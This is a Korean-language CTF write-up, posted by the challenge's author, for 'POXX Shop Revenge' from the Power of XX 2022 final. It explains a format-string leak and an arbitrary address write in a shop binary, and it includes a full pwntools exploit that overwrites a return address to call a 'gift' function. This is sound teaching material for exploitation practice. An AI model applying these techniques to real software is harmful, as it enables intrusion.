<!DOCTYPE html>
<html lang=en>
<head>
    <!-- so meta -->
    <meta charset="utf-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="HandheldFriendly" content="True">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=5" />
    <meta name="description" content="Info(0&#x2F;10) solves description저번에는 이거 shell로 바꿔주셨잖아요.. for player123.├── Dockerfile└── chall  Dockerfile에서 libc를 추출해서 patch한 다음에 문제를 풀어야 한다. 참고로 최신 libc이다. AnalysisMitigation12345Arch:     amd64-6">
<meta property="og:type" content="article">
<meta property="og:title" content="Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)">
<meta property="og:url" content="https://jiravvit.github.io/221121-poxx2022-shop_revenge/index.html">
<meta property="og:site_name" content="jir4vvit">
<meta property="og:description" content="Info(0&#x2F;10) solves description저번에는 이거 shell로 바꿔주셨잖아요.. for player123.├── Dockerfile└── chall  Dockerfile에서 libc를 추출해서 patch한 다음에 문제를 풀어야 한다. 참고로 최신 libc이다. AnalysisMitigation12345Arch:     amd64-6">
<meta property="og:locale" content="en_US">
<meta property="article:published_time" content="2022-11-20T23:00:00.000Z">
<meta property="article:modified_time" content="2022-12-22T18:47:30.711Z">
<meta property="article:author" content="jir4vvit">
<meta property="article:tag" content="FULL RELRO">
<meta property="article:tag" content="Power Of XX">
<meta name="twitter:card" content="summary">
    
    
      
        
          <link rel="shortcut icon" href="/images/judi2.jpg">
        
      
      
        
          <link rel="icon" type="image/png" href="/images/judi2.jpg" sizes="192x192">
        
      
      
        
          <link rel="apple-touch-icon" sizes="180x180" href="/images/judi2.jpg">
        
      
    
    <!-- title -->
    <title>Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)</title>
    <!-- styles -->
    
<link rel="stylesheet" href="/css/style.css">

    <!-- persian styles -->
    
    <!-- rss -->
    
    
	<!-- mathjax -->
	
<meta name="generator" content="Hexo 6.3.0"></head>

<body class="max-width mx-auto px3 ltr">
    
      <div id="header-post">
  <a id="menu-icon" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="menu-icon-tablet" href="#" aria-label="Menu"><i class="fas fa-bars fa-lg"></i></a>
  <a id="top-icon-tablet" href="#" aria-label="Top" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');" style="display:none;"><i class="fas fa-chevron-up fa-lg"></i></a>
  <span id="menu">
    <span id="nav">
      <ul>
        <!--
       --><li><a href="/about/">About</a></li><!--
     --><!--
       --><li><a href="/archives/">Writing</a></li><!--
     --><!--
       --><li><a href="/categories/">Category</a></li><!--
     --><!--
       --><li><a href="/search/">Search</a></li><!--
     -->
      </ul>
    </span>
    <br/>
    <span id="actions">
      <ul>
        
        <li><a class="icon" aria-label="Previous post" href="/221122-how_to_rip_control_in_libc236/"><i class="fas fa-chevron-left" aria-hidden="true" onmouseover="$('#i-prev').toggle();" onmouseout="$('#i-prev').toggle();"></i></a></li>
        
        
        <li><a class="icon" aria-label="Next post" href="/jadectf2022-guess_game/"><i class="fas fa-chevron-right" aria-hidden="true" onmouseover="$('#i-next').toggle();" onmouseout="$('#i-next').toggle();"></i></a></li>
        
        <li><a class="icon" aria-label="Back to top" href="#" onclick="$('html, body').animate({ scrollTop: 0 }, 'fast');"><i class="fas fa-chevron-up" aria-hidden="true" onmouseover="$('#i-top').toggle();" onmouseout="$('#i-top').toggle();"></i></a></li>
        <li><a class="icon" aria-label="Share post" href="#"><i class="fas fa-share-alt" aria-hidden="true" onmouseover="$('#i-share').toggle();" onmouseout="$('#i-share').toggle();" onclick="$('#share').toggle();return false;"></i></a></li>
      </ul>
      <span id="i-prev" class="info" style="display:none;">Previous post</span>
      <span id="i-next" class="info" style="display:none;">Next post</span>
      <span id="i-top" class="info" style="display:none;">Back to top</span>
      <span id="i-share" class="info" style="display:none;">Share post</span>
    </span>
    <br/>
    <div id="share" style="display: none">
      <ul>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.facebook.com/sharer.php?u=https://jiravvit.github.io/221121-poxx2022-shop_revenge/"><i class="fab fa-facebook " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://twitter.com/share?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&text=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-twitter " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.linkedin.com/shareArticle?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-linkedin " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://pinterest.com/pin/create/bookmarklet/?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&is_video=false&description=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-pinterest " aria-hidden="true"></i></a></li>
  <li><a class="icon" href="mailto:?subject=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)&body=Check out this article: https://jiravvit.github.io/221121-poxx2022-shop_revenge/"><i class="fas fa-envelope " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://getpocket.com/save?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-get-pocket " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://reddit.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-reddit " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.stumbleupon.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-stumbleupon " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://digg.com/submit?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&title=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-digg " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="http://www.tumblr.com/share/link?url=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&name=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)&description="><i class="fab fa-tumblr " aria-hidden="true"></i></a></li>
  <li><a class="icon" target="_blank" rel="noopener" href="https://news.ycombinator.com/submitlink?u=https://jiravvit.github.io/221121-poxx2022-shop_revenge/&t=Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)"><i class="fab fa-hacker-news " aria-hidden="true"></i></a></li>
</ul>

    </div>
    <div id="toc">
      <ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#Info"><span class="toc-number">1.</span> <span class="toc-text">Info</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#description"><span class="toc-number">1.1.</span> <span class="toc-text">description</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#for-player"><span class="toc-number">1.2.</span> <span class="toc-text">for player</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Analysis"><span class="toc-number">2.</span> <span class="toc-text">Analysis</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Mitigation"><span class="toc-number">3.</span> <span class="toc-text">Mitigation</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Souece-Code"><span class="toc-number">4.</span> <span class="toc-text">Souece Code</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Vunlerability"><span class="toc-number">5.</span> <span class="toc-text">Vunlerability</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit"><span class="toc-number">6.</span> <span class="toc-text">Exploit</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Scnario-1-intend"><span class="toc-number">7.</span> <span class="toc-text">Exploit Scnario 1 (intend)</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code"><span class="toc-number">8.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#loop-%ED%9A%9F%EC%88%98-%EB%B3%80%EA%B2%BD"><span class="toc-number">8.1.</span> <span class="toc-text">loop 횟수 변경</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Scnario-2"><span class="toc-number">9.</span> <span class="toc-text">Exploit Scnario 2</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Exploit-Code-1"><span class="toc-number">10.</span> <span class="toc-text">Exploit Code</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#GOT-overwriting"><span class="toc-number">10.1.</span> <span class="toc-text">GOT overwriting</span></a></li></ol></li><li class="toc-item toc-level-2"><a class="toc-link" href="#Review"><span class="toc-number">11.</span> <span class="toc-text">Review</span></a></li></ol>
    </div>
  </span>
</div>

    
    <div class="content index py4">
        
        <article class="post" itemscope itemtype="http://schema.org/BlogPosting">
  <header>
    
    <h1 class="posttitle" itemprop="name headline">
        Power of XX 2022 Final - POXX Shop Revenge (fsb, aaw)
    </h1>



    <div class="meta">
      <span class="author" itemprop="author" itemscope itemtype="http://schema.org/Person">
        <span itemprop="name">jir4vvit</span>
      </span>
      
    <div class="postdate">
      
        <time datetime="2022-11-20T23:00:00.000Z" itemprop="datePublished">2022-11-21</time>
        
      
    </div>


      
    <div class="article-category">
        <i class="fas fa-archive"></i>
        <a class="category-link" href="/categories/WriteUp/">WriteUp</a> › <a class="category-link" href="/categories/WriteUp/Making/">Making</a>
    </div>


      
    <div class="article-tag">
        <i class="fas fa-tag"></i>
        <a class="tag-link-link" href="/tags/FULL-RELRO/" rel="tag">FULL RELRO</a>, <a class="tag-link-link" href="/tags/Power-Of-XX/" rel="tag">Power Of XX</a>
    </div>


    </div>
  </header>
  

  <div class="content" itemprop="articleBody">
    <h2 id="Info"><a href="#Info" class="headerlink" title="Info"></a>Info</h2><p>(0&#x2F;10) solves</p>
<h3 id="description"><a href="#description" class="headerlink" title="description"></a>description</h3><p>저번에는 이거 shell로 바꿔주셨잖아요..</p>
<h3 id="for-player"><a href="#for-player" class="headerlink" title="for player"></a>for player</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.</span><br><span class="line">├── Dockerfile</span><br><span class="line">└── chall</span><br></pre></td></tr></table></figure>

<p>Dockerfile에서 libc를 추출해서 patch한 다음에 문제를 풀어야 한다. 참고로 최신 libc이다.</p>
<h2 id="Analysis"><a href="#Analysis" class="headerlink" title="Analysis"></a>Analysis</h2><h2 id="Mitigation"><a href="#Mitigation" class="headerlink" title="Mitigation"></a>Mitigation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">Arch:     amd64-64-little</span><br><span class="line">RELRO:    Full RELRO</span><br><span class="line">Stack:    No canary found</span><br><span class="line">NX:       NX enabled</span><br><span class="line">PIE:      PIE enabled</span><br></pre></td></tr></table></figure>

<p>No canary found라고 나오지만 canary가 존재한다.</p>
<p>FULL RELRO라서 GOT overwriting이 불가능하다. 그래서 보통 <code>malloc_hook</code>, <code>free_hook</code>, <code>_rtld_global._dl_rtld_lock_recursive</code> 등을 덮어 실행 흐름을 조작할 수 있다. 하지만 문제에서 최신 libc를 사용하기 때문에 <code>malloc_hook</code>과 <code>free_hook</code> 등을 덮는 것은 불가능하고 덮을 다른 곳을 찾아봐야 한다.</p>
<h2 id="Souece-Code"><a href="#Souece-Code" class="headerlink" title="Souece Code"></a>Souece Code</h2><p>ida 전체 코드이다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __cdecl __noreturn <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">void</span> *v3; <span class="comment">// rsp</span></span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+0h] [rbp-40h] BYREF</span></span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+4h] [rbp-3Ch]</span></span><br><span class="line">  <span class="type">void</span> *buf; <span class="comment">// [rsp+8h] [rbp-38h]</span></span><br><span class="line">  _QWORD *v7; <span class="comment">// [rsp+10h] [rbp-30h]</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v8; <span class="comment">// [rsp+18h] [rbp-28h]</span></span><br><span class="line">  _BYTE nptr[<span class="number">23</span>]; <span class="comment">// [rsp+29h] [rbp-17h] BYREF</span></span><br><span class="line"></span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">15</span>] = __readfsqword(<span class="number">0x28</span>u);</span><br><span class="line">  v3 = alloca(<span class="number">176LL</span>);</span><br><span class="line">  buf = &amp;v4;</span><br><span class="line">  *(_QWORD *)nptr = <span class="number">0LL</span>;</span><br><span class="line">  *(_QWORD *)&amp;nptr[<span class="number">7</span>] = <span class="number">0LL</span>;</span><br><span class="line">  initialize(argc, argv, <span class="number">8LL</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;*** POXX Shop! ***\n&quot;</span>);</span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">1</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;1. Buy&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;2. Exchange&quot;</span>);</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;3. Return&quot;</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">if</span> ( v4 == <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;What do you want for return?&quot;</span>);</span><br><span class="line">      <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">      read(<span class="number">0</span>, buf, <span class="number">0xA0</span>uLL);</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;Sorry, It&#x27;s impossible.&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span> <span class="keyword">if</span> ( v4 &lt;= <span class="number">3</span> )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">if</span> ( v4 == <span class="number">1</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">        <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="number">110</span>) )</span><br><span class="line">          <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);</span><br><span class="line">      &#125;</span><br><span class="line">      <span class="keyword">else</span> <span class="keyword">if</span> ( v4 == <span class="number">2</span> )</span><br><span class="line">      &#123;</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">        v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">        read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">        v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">        *v7 = v8;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;Bye&quot;</span>);</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>아래 1번 메뉴와 2번 메뉴에서 각각 취약점이 존재하며, 해당 취약점을 이용해서 익스플로잇 코드 작성이 가능하다.</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> ( choice == <span class="number">1</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, buf, <span class="number">0xF</span>uLL);</span><br><span class="line">  <span class="keyword">if</span> ( !<span class="built_in">strchr</span>((<span class="type">const</span> <span class="type">char</span> *)buf, <span class="string">&#x27;n&#x27;</span>) )</span><br><span class="line">    <span class="built_in">printf</span>((<span class="type">const</span> <span class="type">char</span> *)buf);            <span class="comment">// fsb</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span> <span class="keyword">if</span> ( choice == <span class="number">2</span> )</span><br><span class="line">&#123;</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;Would you like an exchange? What about?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0xF</span>uLL);</span><br><span class="line">  v7 = (_QWORD *)strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;I can exchange it for another for you. What do you want?&quot;</span>);</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;&gt;&gt; &quot;</span>);</span><br><span class="line">  read(<span class="number">0</span>, nptr, <span class="number">0x14</span>uLL);</span><br><span class="line">  v8 = strtoul(nptr, <span class="number">0LL</span>, <span class="number">10</span>);</span><br><span class="line">  *v7 = v8;                               <span class="comment">// aaw</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>먼저 1번 메뉴를 살펴보자. buf에 입력을 받고 <code>printf</code>로 출력을 해준다. 이 때 fsb가 발생하지만 ‘n’을 필터링하고 있기 때문에 스택 주소 leak만 가능하다.</p>
<p>2번 메뉴에서는 <code>*v7 = v8;</code> 이 구문을 통해 원하는 주소에 원하는 값을 쓸 수 있다. 다시 말해서 임의 주소 쓰기가 가능하다.</p>
<p>이때 <code>strtoul</code>을 이용해서 정수로 구성된 str을 unsigned long으로 바꿔준다. </p>
<p>v7에 0x7ffcea69ddf0를 넣고 싶다면? <code>read</code>에서 nptr에 해당 값을 입력해야한다. 그럼 <code>strtoul</code> 함수의 인자는 아래와 같이 들어가게 된다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">strtoul@plt (</span><br><span class="line">   $rdi = 0x007ffcea69de19 → &quot;140724241292784&quot;,</span><br><span class="line">   $rsi = 0x00000000000000,</span><br><span class="line">   $rdx = 0x0000000000000a</span><br><span class="line">)</span><br></pre></td></tr></table></figure>

<p>그리고 반환값은 아래와 같다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$rax   : 0x007ffcea69ddf0</span><br></pre></td></tr></table></figure>

<p>출제자의 입장에서 v7을 위한 nptr을 입력받을 때 왜 size가 0xF인 이유를 설명해보겠다. </p>
<p>보통 인텔 64bit에서 립시나 스택 주소는 0x7f로 시작하게 되고, 못해도 원하는 입력하고 싶은 주소의 범위는 아래와 같을 것이라고 생각했다.</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">0x7f0000000000 ~ 0x7fffffffffff</span><br><span class="line">139637976727552 ~ 140737488355327</span><br></pre></td></tr></table></figure>

<p>이 값은 <code>strtoul</code> 함수에 의해 문자열(예를 들면 140737488355327)이 unsigned long으로 바뀌게 되므로, 입력하는 글자 수를 <code>len(&#39;140737488355327&#39;)=15</code>로 제한하게 되었다.</p>
<p>또한 v8을 위한 nptr 입력도 0x14로 특별히 제한한 이유가 있다. 이 글의 언인텐이 아닌 다음 글의 언인텐을 위해서다. (출제할 때부터 인지하고 있었던 언인텐이고 일부러 입력 크기를 0x14로 두고 언인텐을 방지하지 않았다.) </p>
<p>이에 관해서는 다음 글에서 설명하도록 한다.</p>
<h2 id="Vunlerability"><a href="#Vunlerability" class="headerlink" title="Vunlerability"></a>Vunlerability</h2><p>아무리 봐도 bof는 터지지 않는다. 임의 주소 쓰기와 스택 주소 leak을 이용하여 Exploit을 진행해보자.</p>
<p>스택에 있는 주소를 모두 출력할 수 있다는 것은 강력한 취약점이다. pie base, libc base, stack address 등을 바로 구할 수 있기 때문이다.</p>
<h2 id="Exploit"><a href="#Exploit" class="headerlink" title="Exploit"></a>Exploit</h2><p>인텐과 언인텐 하나씩 소개한다. 인텐은 스택 ret를 gift 함수로 덮는 것이다. 이 문제는 예선 때 냈던 문제를 살짝 바꿔서 낸 문젠데 예선 때 풀어주신 분들이 모두 똑같은 방식(언인텐)으로 푸셔서 그 부분을 패치해서 냈다. </p>
<p>목표는 1. 패치를 통해 예선 때의 언인텐 풀이가 불가능 한 것, 2. 포너블 올클 방지 였다. 예선 때의 언인텐은 main 함수가 <code>return 0</code>으로 종료되어서 스택 ret를 gift함수 주소로 바꿔서 풀이하는 것이다. 이것을 방지하기 위해 main이 종료하는 부분을 <code>exit(0)</code>으로 변경하였다. 본선 문제를 풀이할 때 read 함수의 ret를 덮지 않고 풀이를 했으나 해당 방식은 익스하는데 오랜 시간이 걸려서 다른 익스 방식을 탐색하였다. 결국 예선 언인텐과 비슷한 방식의 풀이를 본선 인텐으로 채택하였다. 재밌는 것은 대회 끝나고 해당 문제를 풀이하려고 하신 분의 익스 코드를 살펴봤는데 이 방법이 아니라 다른 방법으로 시도하고 계셨다.. 이 방법도 해당 글에 소개하도록 하겠다.</p>
<h2 id="Exploit-Scnario-1-intend"><a href="#Exploit-Scnario-1-intend" class="headerlink" title="Exploit Scnario 1 (intend)"></a>Exploit Scnario 1 (intend)</h2><ol>
<li>stack address를 구한 뒤, loop 횟수 변경</li>
<li>pie base 구하기</li>
<li>buf를 read ret로 변경 후 gift 입력 (read ret를 gift)</li>
</ol>
<h2 id="Exploit-Code"><a href="#Exploit-Code" class="headerlink" title="Exploit Code"></a>Exploit Code</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">context.arch = <span class="string">&#x27;amd64&#x27;</span></span><br><span class="line"><span class="comment">#context.log_level = &#x27;DEBUG&#x27;</span></span><br><span class="line"></span><br><span class="line">e = ELF(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line">p = process(<span class="string">&#x27;./chall&#x27;</span>)</span><br><span class="line"><span class="comment">#p = remote(&#x27;43.201.142.219&#x27;, 49166)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Buy</span>(<span class="params">content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;1&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, content)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">Exchange</span>(<span class="params">addr, content</span>):</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="string">&#x27;2&#x27;</span>)</span><br><span class="line">    p.sendafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(addr))</span><br><span class="line">    p.sendlineafter(<span class="string">&#x27;&gt;&gt;&#x27;</span>, <span class="built_in">str</span>(content))</span><br><span class="line"></span><br><span class="line"><span class="comment"># [1]</span></span><br><span class="line">Buy(<span class="string">&#x27;%29$p&#x27;</span>)</span><br><span class="line">stack_leak = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>)</span><br><span class="line">info(<span class="string">&#x27;stack leak :: &#x27;</span> + <span class="built_in">hex</span>(stack_leak))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct.unpack(&#x27;q&#x27;,(struct.pack(&#x27;i&#x27;,-1)+struct.pack(&#x27;i&#x27;,-10)))[0]</span></span><br><span class="line"><span class="comment"># -38654705665</span></span><br><span class="line">Exchange(stack_leak + <span class="number">0xb0</span>, -<span class="number">38654705665</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># [2]</span></span><br><span class="line">Buy(<span class="string">&#x27;%39$p_&#x27;</span>)</span><br><span class="line">e.address = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;_&#x27;</span>)[:-<span class="number">1</span>], <span class="number">16</span>) - <span class="number">0x1277</span></span><br><span class="line">info(<span class="string">&#x27;pie base :: &#x27;</span> + <span class="built_in">hex</span>(e.address)) <span class="comment"># pie base</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># [3]</span></span><br><span class="line">pause()</span><br><span class="line">Exchange(stack_leak + <span class="number">0xb8</span>, stack_leak - <span class="number">0x8</span>) <span class="comment"># buf -&gt; read ret</span></span><br><span class="line">Buy(p64(e.sym[<span class="string">&#x27;gift&#x27;</span>]))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>

